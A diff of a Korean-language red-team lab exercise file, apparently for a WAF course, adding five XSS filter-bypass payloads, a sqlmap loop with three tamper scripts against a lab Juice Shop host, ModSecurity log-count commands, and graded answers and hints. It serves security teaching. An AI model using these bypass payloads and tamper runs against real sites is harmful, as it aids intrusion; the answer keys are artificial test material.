@@ -20,7 +20,18 @@ steps:
     instruction: |
       ## 🎯 MISSION
 
-      XSS payload **5 우회 변형** → ModSec 응답 비교 (paranoia 1 우회 가능 여부).
+      XSS payload **5 우회 변형** → ModSec 응답 비교 + 각 변형의 *우회 의도* 인지 +
+      ModSec 941 카운트 추적.
+
+      ## 💡 5 변형의 우회 의도 (학습 핵심)
+
+      | # | payload | 우회 기법 | 대응 룰 |
+      |---|---------|-----------|---------|
+      | 1 | `<script>alert(1)</script>` | baseline | 941100 |
+      | 2 | `<ScRiPt>alert(1)</ScRiPt>` | case mixing — regex 정규화 무시 노림 | 941100 (`(?i)`) |
+      | 3 | `%3Cscript%3Ealert(1)%3C/script%3E` | URL encoding — 디코드 전 매칭 회피 | ModSec 가 decode 후 매칭 |
+      | 4 | `<sc<script>ript>alert(1)</script>` | nested tag — filter 가 내부 `<script>` 제거 시 외부 `script` 잔존 | libinjection 가 토큰 분석 |
+      | 5 | `<svg/onload=alert(1)>` | event handler — `<script>` 키워드 없이 JS 실행 | 941160 (event handler) |
 
       ## 💻 실행 명령
 
@@ -31,22 +42,34 @@ steps:
         echo "$code | $p"
       done
       '
+      # ModSec 941 카운트 매트릭스
+      ssh 6v6-web 'sudo grep -c "id..\"941" /var/log/apache2/modsec_audit.log 2>/dev/null'
       ```
 
       ## 📋 확인 사항
 
-      - 5 변형 모두 403 (paranoia 1 의 941 룰셋이 모두 차단)
-      - 일부 변형은 paranoia 2 에서만 차단 가능
+      - 5 변형 모두 403 (paranoia 1 + CRS 941 룰셋 + libinjection 강력)
+      - ModSec 941 카운트 증가 (5 시도 = +5 매칭)
 
       ## 💡 왜 이걸 하는가?
 
-      Red Team — WAF 우회 패턴 학습. paranoia 1 의 한계 + paranoia 2 권장.
+      Red Team — WAF 우회 패턴 학습. 각 변형이 *어떤 가정* 을 깨려고 하는지 + 현
+      CRS / libinjection 의 *어떤 보호* 가 효과적인지 인지.
 
       ## 🔍 결과 해석
 
-      - **모두 403**: paranoia 1 + libinjection 강력
-      - **일부 200**: 우회 성공 → exception 후보 (Blue 측 검토)
-    hint: XSS 5 우회 변형
+      - **모두 403**: paranoia 1 + libinjection 강력 (예상)
+      - **일부 200**: 우회 성공 → exception 후보 (Blue 측 검토 + custom 룰 추가)
+      - **모두 200**: ModSec 비활성 — `apachectl -M | grep security2` 로 확인
+
+      ## 비정상 시 대응
+
+      - **모두 200** — ModSec 비활성 또는 SecRuleEngine Off. `grep
+        SecRuleEngine /etc/apache2/mods-enabled/security2.conf`
+      - **모두 500** — ModSec 룰 syntax 오류. apache error_log 확인.
+    hint: |
+      XSS 5 우회 변형 + 각 의도 + 941 카운트 매트릭스. case/encoding/nested/event
+      handler 의 *근거* 까지 인지.
     category: bypass
     points: 25
     answer: |
@@ -79,44 +102,72 @@ steps:
     instruction: |
       ## 🎯 MISSION
 
-      sqlmap의 **3 tamper 스크립트** 효과 비교 (space2comment / randomcase / between).
+      sqlmap의 **3 tamper 스크립트** 효과 비교 + 각 tamper 의 *변형 메커니즘* 인지 +
+      ModSec 942 카운트 매트릭스.
+
+      ## 💡 3 tamper 의 변형 메커니즘 (학습 핵심)
+
+      | tamper | 입력 → 변형 | 우회 의도 |
+      |--------|-------------|-----------|
+      | `space2comment` | `UNION SELECT` → `UNION/**/SELECT` | space 매칭 룰 회피 |
+      | `randomcase` | `SELECT` → `SeLeCt` | regex `(?i)` 누락 룰 회피 |
+      | `between` | `id=1` → `id BETWEEN 0 AND 2` | `=` 키워드 매칭 회피 |
 
       ## 💻 실행 명령
 
       ```bash
+      # tail -8 로 sqlmap 의 conclusion (parameter vulnerable 여부) 까지 표시
       ssh 6v6-attacker '
-      for tamper in "space2comment" "randomcase" "between"; do
+      for tamper in space2comment randomcase between; do
         echo "=== $tamper ==="
-        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" 2>&1 | tail -3
+        timeout 25 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | tail -8 | grep -iE "vulnerable|not vulnerable|all tested|ending|HTTPS|connect"
       done
-      ' || echo "timeout"
+      '
+      # 942 카운트 증가
+      ssh 6v6-web 'sudo grep -c "id..\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
       ```
 
       ## 📋 확인 사항
 
-      - 3 tamper 모두 실행
-      - 각 tamper 의 ModSec 우회 가능성
+      - 3 tamper 모두 실행 + ending 출력
+      - sqlmap 의 *vulnerable / not vulnerable* 결론 (대부분 not vulnerable — Juice
+        Shop 의 `/?q=` 는 SPA route, SQL endpoint 가 아님)
+      - 942 카운트 증가
 
       ## 💡 왜 이걸 하는가?
 
-      sqlmap 의 --tamper 가 WAF 우회의 표준 도구. 운영 측은 paranoia 상승 + custom 룰
-      추가로 대응.
+      sqlmap 의 --tamper 가 WAF 우회의 표준 도구. 학생이 *각 tamper 의 변형
+      메커니즘* 까지 인지 → custom tamper 작성 능력 의 토대.
 
       ## 🔍 결과 해석
 
-      - **정상**: 3 tamper 모두 실행 (대부분 ModSec 차단됨)
-      - **운영 권장**: production 환경은 paranoia 2 + libinjection 의존
-    hint: sqlmap --tamper 3 스크립트
+      - **3 ending**: sqlmap 실행 완료
+      - **all not vulnerable**: Juice Shop 의 ModSec + libinjection 강력 + endpoint
+        자체 SQL injection 불가
+      - **942 카운트 증가**: tamper 시도 자체 가 ModSec 패턴 매칭
+
+      ## 비정상 시 대응
+
+      - **timeout 25 초과** — `--threads=1` 또는 `--delay=1` 추가
+      - **sqlmap 자체 거부** — `sqlmap --version` 확인 (1.x 이상)
+      - **942 카운트 0** — audit log path 다름. `sudo find /var/log -name
+        "modsec_audit*"`
+    hint: |
+      sqlmap --tamper 3 + 각 tamper 메커니즘 + 942 카운트 매트릭스. SPA endpoint
+      라 *not vulnerable* 결론이 정상.
     category: bypass
     points: 25
     answer: |
       ssh 6v6-attacker '
-      for tamper in "space2comment" "randomcase" "between"; do
+      for tamper in space2comment randomcase between; do
         echo "=== $tamper ==="
-        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" 2>&1 | tail -3
+        timeout 25 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | tail -8 | grep -iE "vulnerable|not vulnerable|all tested|ending|HTTPS|connect"
       done
-      ' || echo "timeout"
-    answer_detail: 3 tamper 효과 비교.
+      '
+      ssh 6v6-web 'sudo grep -c "id..\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
+    answer_detail: |
+      3 tamper × sqlmap + 각 변형 메커니즘 + 942 카운트. SPA endpoint 라 not
+      vulnerable 이 정상 결론.
     verify:
       type: output_contains
       expect: 'space\|random\|between'
